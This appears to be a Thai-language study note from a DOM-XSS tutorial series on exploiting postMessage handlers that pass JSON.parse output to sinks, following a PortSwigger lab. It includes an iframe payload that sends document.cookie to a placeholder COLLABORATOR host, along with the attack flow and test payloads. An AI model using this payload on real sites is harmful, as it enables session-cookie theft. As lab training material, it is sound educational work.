# Pattern 3: JSON.parse + postMessage
> [Back to Index](../README.md) | [Previous: document.write](pattern-2-document-write.md)

---

## Overview

**Source:** `postMessage` data
**Sink:** `element.src`, `location.replace()`
**Delivery:** iframe + onload

---

## Window และ postMessage

### Window คืออะไร?

`window` = object หลักของ browser ที่แทน "หน้าต่าง" หรือ "tab"

```
Browser Tab = 1 Window Object

window.document  → HTML ทั้งหมด
window.location  → URL ปัจจุบัน
window.cookie    → cookies
```

### หลาย Window ใน iframe

```
┌─────────────────────────────────────────────────────────┐
│  Parent Window (exploit-server.net)                     │
│  ┌───────────────────────────────────────────────────┐ │
│  │  window ← parent                                  │ │
│  │  ┌─────────────────────────────────────────────┐ │ │
│  │  │  iframe (target.net)                        │ │ │
│  │  │  contentWindow ← iframe's window            │ │ │
│  │  └─────────────────────────────────────────────┘ │ │
│  └───────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────┘
```

---

## Vulnerable Code Pattern

```javascript
window.addEventListener('message', function(e) {
    var d;
    try {
        d = JSON.parse(e.data);  // ← Parse data
    } catch(e) {
        return;
    }

    switch(d.type) {
        case "load-channel":
            ACMEplayer.element.src = d.url;  // ← SINK!
            break;
        case "redirect":
            window.location.replace(d.redirectUrl);  // ← SINK!
            break;
    }
}, false);
```

**จุดอันตราย:**
- ไม่มี origin validation (`if (e.origin !== "...")`)
- ใช้ JSON.parse กับ untrusted data
- ส่ง data ไป dangerous sink

---

## Payload

```html
<iframe src="https://TARGET.net/"
        onload='this.contentWindow.postMessage(
          JSON.stringify({
            type: "load-channel",
            url: "javascript:fetch(`https://COLLABORATOR/?c=`+encodeURIComponent(document.cookie))"
          }), "*")'>
</iframe>
```

**Breakdown:**
| ส่วน | ความหมาย |
|------|----------|
| `this.contentWindow` | window ของ iframe |
| `.postMessage(...)` | ส่ง message |
| `JSON.stringify({...})` | แปลง object → JSON |
| `type: "load-channel"` | match switch case |
| `url: "javascript:..."` | payload ที่จะ execute |
| `"*"` | targetOrigin = any |

---

## Session Cookie Stealing

**Requirements:**
- Same-origin execution ✓
- Non-HttpOnly cookies ✓

**Cookie Flags ที่ต้องเช็ค:**
| Flag | Secure | Insecure |
|------|--------|----------|
| HttpOnly | มี → JS อ่านไม่ได้ | ไม่มี → อ่านได้ ✓ |
| SameSite | Strict | None ✓ |

---

## Attack Flow

```
1. Attacker สร้าง iframe บน Exploit Server
         ↓
2. ส่ง link ให้ Victim
         ↓
3. Victim คลิก → iframe โหลด TARGET
         ↓
4. onload → postMessage ส่ง JSON
         ↓
5. TARGET รับ → JSON.parse → ส่งไป sink
         ↓
6. javascript: URL execute
         ↓
7. Cookie ส่งไป Collaborator
```

---

## DOM Invader Testing

```json
// แก้ไข message แล้ว Replay
{
    "type": "load-channel",
    "url": "javascript:alert(document.cookie)"
}
```

---

## Checklist

```
✓ หา addEventListener('message', ...)
✓ เช็คว่ามี origin validation ไหม
✓ หา JSON.parse(e.data)
✓ ดูว่า data ไปถึง sink อะไร
✓ ใช้ DOM Invader ช่วยหา
✓ Cookie ต้องไม่มี HttpOnly
```

---

## Lab Reference
- [PortSwigger Lab: DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)

---

> **Next:** [pattern-4-javascript-url.md](pattern-4-javascript-url.md)
